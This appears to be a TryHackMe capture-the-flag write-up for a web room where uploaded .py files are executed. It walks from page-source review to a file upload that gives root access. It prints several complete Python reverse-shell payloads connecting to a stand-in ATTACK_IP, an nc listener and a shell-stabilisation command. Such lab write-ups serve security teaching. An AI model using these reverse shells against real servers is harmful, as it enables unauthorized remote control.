<h1 align="center"><a href="https://tryhackme.com/room/lafb2026e4">Speed Chatting</a></h1>
<p align="center">Love at First Breach 2026 &nbsp; · &nbsp; Web &nbsp; · &nbsp; Unrestricted File Upload to RCE<br><br><img width="1200px" src="https://github.com/user-attachments/assets/055ad36c-3bac-4518-9c33-75ffc9eca66f"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20FEV%2015-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p

<br>
<br>

<p>The target machine allows uploading a .py file and misconfigures the web server to execute it when accessed. Uploading a Python reverse shell leverage unauthorized access via image tag request.</p>


<h1>Speed Chat</h1>

```bash
My Dearest Hacker,
Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.

As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

You can find the web application here: http://MACHINE_IP:5000
```

<br>
<h2>Reconnaissance  .  Port Enumeration</h2>

```bash
:~# nmap -Pn -p5000 -T4 MACHINE_IP
...
PORT     STATE SERVICE
5000/tcp open  upnp
```

<br>
<h2>Reconnaissance  .  Web Discovery</h2>

<img width="1341" height="671" alt="image" src="https://github.com/user-attachments/assets/50509edc-4ecc-4493-9719-9744a30b880d" />

<br>
<br>
<br>
<h2>Reconnaissance  .  Source Code Analysis</h2>

<p>

- Navigate to <strong>MACHINE_ip:5000</strong><br>
- Right-click the page and select <strong>Inspect</strong> or <strong>View Page Source</strong>.</p>

<br>
<p>Profile Section</p>

```bash
<div class='container'>
        <h1>LoveConnect</h1>
        <p class='tagline'>Speed Chat - Find Your Valentine!</p>

        <div class='main-grid'>
            <!-- Profile Section -->
            <div class='profile-card'>
                <h3>Your Profile</h3>
                
                
                
                <img src='/uploads/default.jpg' class='profile-pic' alt='Profile Picture' 
                     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Ccircle cx=%2275%22 cy=%2275%22 r=%2275%22 fill=%22%23f48fb1%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22white%22 font-size=%2250%22%3E\u2764\ufe0f%3C/text%3E%3C/svg%3E'">
                
                <div class='username'>demo</div>
                <div class='bio'>Looking for love!</div>
                
                <div class='upload-section'>
                    <h4>Update Photo</h4>
                    <form action='/upload_profile_pic' method='post' enctype='multipart/form-data' id='uploadForm'>
                        <label for='fileInput' class='file-label'>
                            Choose File
                        </label>
                        <input type='file' id='fileInput' name='profile_pic' required>
                        <div class='file-name' id='fileName'>No file selected</div>
                        <button type='submit'>Upload</button>
                    </form>
                </div>
            </div>

            <!-- Chat Section -->
            <div class='chat-card'>
                <h3>Speed Chat Room</h3>
                
                <div class='chat-container' id='chatContainer'>
                    <!-- Messages loaded here -->
                </div>
                
                <div class='chat-input-container'>
                    <input type='text' id='chatInput' placeholder='Type your message...' maxlength='200'>
                    <button id='sendBtn'>Send</button>
                </div>
            </div>
        </div>
    </div>
```

<p>
  
-  Analyze the <strong>HTML</strong> structure.<br>
-  Note the <code>&lt;img&gt;</code> tag where <code>src</code> points to a <code>.py</code> file (e.g., <code>/uploads/profile_00e10366-de69-4c03-ab0a-278672b4bb4.py</code>) instead of an image format.<br>
-  Identify the <strong>Unrestricted File Upload</strong> potential, as the server serves Python scripts as static assets.<br>
-  Note the <code>&lt;form&gt;</code> action points to <code>/upload_profile_pic</code> using the <strong>POST</strong> method and <code>multipart/form-data</code> encoding.</p>

<br>
<p>File Upload</p>

```bash
  <script>
        // File upload
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name || 'No file selected';
            document.getElementById('fileName').textContent = fileName;
        });
        
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            const button = this.querySelector('button');
            button.textContent = 'Uploading...';
            button.disabled = true;
        });
```

<p>

-  Analyze the <strong>JavaScript</strong> event listeners attached to the file upload elements.<br>
-  Note the <code>change</code> event on <code>fileInput</code> which extracts the <strong>filename</strong> from the event object <code>e.target.files[0]</code>.<br>
-  Observe the DOM manipulation where <code>textContent</code> updates the display to show the selected filename.<br>
-  Note the <code>submit</code> event listener that disables the upload button to prevent double-submissions during the request.</p>


<br>
<p>Chat Functionality</p>

```bash
  <script>
        // File upload
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name || 'No file selected';
            document.getElementById('fileName').textContent = fileName;
        });
        
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            const button = this.querySelector('button');
            button.textContent = 'Uploading...';
            button.disabled = true;
        });
```

<p>

-  Analyze the Chat Functionality logic.<br>
-  Note that sending a message triggers a <strong>POST</strong> request to the API.<br>
-  Observe the <strong>Polling</strong> mechanism implemented via <code>setInterval</code>.<br>
-  Note that the application sends cyclic <strong>GET</strong> requests every <strong>3000</strong> ms to <code>/api/messages</code> to retrieve the chat history updates.</p>


<br>
<p>Chat Functionality - function loadMessages()</p>

```bash
function loadMessages() {
            fetch('/api/messages')
                .then(r => r.json())
                .then(messages => {
                    chatContainer.innerHTML = '';
                    messages.forEach(msg => {
                        const div = document.createElement('div');
                        div.className = 'message' + (msg.user === 'demo' ? ' demo' : '');
                        
                        // Create text nodes to prevent any HTML rendering
                        const userDiv = document.createElement('div');
                        userDiv.className = 'message-user';
                        userDiv.textContent = msg.user;
                        
                        const textDiv = document.createElement('div');
                        textDiv.className = 'message-text';
                        textDiv.textContent = msg.text;
                        
                        const timeDiv = document.createElement('div');
                        timeDiv.className = 'message-time';
                        timeDiv.textContent = msg.time;
                        
                        div.appendChild(userDiv);
                        div.appendChild(textDiv);
                        div.appendChild(timeDiv);
                        
                        chatContainer.appendChild(div);
                    });
                    chatContainer.scrollTop = chatContainer.scrollHeight;
                });
        }
```

<p>

-  Scroll down to the <code>loadMessages</code> function.<br>
-  Note the use of the <strong>Fetch API</strong> to retrieve JSON data asynchronously.<br>
-  Observe the <code>innerHTML = ''</code> which clears the chat container before rendering.<br>
-  Note the security measure where <code>textContent</code> is used (instead of <code>innerHTML</code>) for user input, effectively mitigating <strong>Cross-Site Scripting (XSS)</strong> attacks by rendering tags as plain text.</p>

<br>
<p>Chat Functionality - function sendMessage()</p>

```bash
        function sendMessage() {
            const text = chatInput.value.trim();
            if (!text) return;

            fetch('/api/send_message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({text: text})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    chatInput.value = '';
                    loadMessages();
                }
            });
        }

        sendBtn.addEventListener('click', sendMessage);
        chatInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });
```

<p>

-  Scroll down to the <code>sendMessage</code> function.<br>
-  Note the construction of a <strong>JSON</strong> payload using <code>JSON.stringify</code>.<br>
-  Observe the <strong>POST</strong> request sent to the <code>/api/send_message</code> endpoint with <code>application/json</code> headers.<br>
-  Note the <strong>Promise</strong> chain (<code>.then()</code>) that handles the server response and triggers a UI refresh upon success.</p>

<br>
<h2>Reconnaissance  .  Web Discovery</h2>
<p>


-  Right-click on the background of the web page.<br>
-  Select <strong>Inspect</strong>.<br>
-  Select the <strong>Network<>strong> tab in Browser Dev Tools.<br>
-  Type a message.<br>
-  Click <strong>Send</strong>.<br>
-  Note many <strong>200</strong> Status paired with <code>messages</code> File and  <code>fetch()</code> Initiator (evidence of polling).<br>
-  Click over one of the <strong>200</strong> logs.<br>
-  Analyze the Headers, Request and Response.<br>
-  Note that other <strong>200</strong> logs are related to a Response = <strong>JSON</strong></p>

<br>
<h2>Weaponization & Delivery & Exploitation</h2>
<p>Test<br>
  
-  Upload an empty <code>test.py</code> file.<br>
-  Click <strong>Choose File</strong>.<br>
-  Browse and select <code>test.py</code>.<br>
-  Click <strong>Open</strong>.<br>
-  Click <strong>Upload</strong>.<br>
-  Note the <strong>200</strong> Status in the <strong>Network</strong> tab and the green output message.</p>

<br>
<p>Reverse Shell<br>

-  Remember the <code>.py</code> in the source code (the profile picture). This defines thate the server understands and executes Python code. Therefore, you need a Python Reverse Shell.<br>
-  Craft a Python reverse shell <code>rev.py</code>. Hint: Ensure you configure the <strong>YourAttackIP</strong> and <strong>YourAttackPort</strong> correctly. Hint: You can use <a href="https://www.revshells.com">Reverse Shell Generator</a>.<br>
-  Set up a listener: <code>nc -nlvp YourAttackPort</code>.<br>
-  Upload <code>rev.py</code>.<br>
-  Click <strong>Choose File</strong>.<br>
-  Browse and select <code>rev.py</code>.<br>
-  Click <strong>Open</strong>.<br>
-  Click <strong>Upload</strong>.<br>
-  Note that because the Profile Picture source is hardcoded to the file you just uploaded, the <strong>Browser automatically requests</strong> <code>/uploads/rev.py</code> to try and display it as an image. This "GET" request is what triggers the execution of the script on the server.<br>
-  Check the connection established in your listener<br>
-  Stabilize the shell (e.g., <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>).<br>
-  Execute <code>id</code>. Note <code>uid=0(root) gid=-(root) groups=0(root)</code><br>
-  Execute <code>pwd</code>. Note <code>/root</code>.<br>
-  Execute <code>ls -l /root</code>. Note the <code>/uploads</code> directory and the <code>root.txt</code> file.<br>
-  Execute <code>cat /root/root.txt</code> to retrive the flag.</p>

<br>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

<br>
<p>This did not work (ref: Python3 #2)</p>

```bash
import socket,subprocess,os;s=socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACK_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os,dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

<br>
<p>This did not work (ref: Python3 #2)</p>

```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACK_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")
```

<br>
<p>This did not work (ref: Python3 #2)</p>

```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACK_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/sh")
```

<br>
<p>This did not work (ref: Python3 #1)</p>

```bash
export RHOST"ATTACK_IP";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

<br>
<p>This worked</p>

```bash
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACK_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

<br>

<img width="976" height="151" alt="image" src="https://github.com/user-attachments/assets/68d7f71a-3a3a-4824-9fcb-e6466eacfa45" />

<br>
<br>

<img width="977" height="119" alt="image" src="https://github.com/user-attachments/assets/37ec9aee-abf9-4ec5-9bab-65ce61d13048" />

<br>
<br>

<p><em>Answer the question below</em></p>

<p><em>What is the flag?</em><br>
<code>THM{••••••••••••••••••••••••••••••}</code></p>

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/527336a9-509b-4b01-931e-ec7f001db2a3"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/9eb8199b-9cd5-45f2-a560-5c504d0f4b87"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/fb473621-b33d-4621-92e2-30d74d4d323a"><br></p>

<br>
<h1 align="center">My TryHackMe Journey ・ 2026, February</h1>

<p align="center">Global All Time:     44ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/b3c0efbe-7f8f-4436-866a-8a1e9a8ff665"><br>
                                               <img width="1200px" src="https://github.com/user-attachments/assets/0413b2d2-48dd-4052-933c-c42098fb5cca"><br><br>
                  Brazil All Time:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/435ab5a6-1d7e-4d13-9c86-8c6b2e7115cb"><br><br>
                  Global Monthly:       41ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/b46fee71-8eed-4143-9edc-e0261437c9a3"><br><br>
                  Brazil Monthly:       1ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/feb88155-e684-42ef-84eb-ceac89ca59e5"></p>

<h1 align="center">Thanks for coming!</h1>
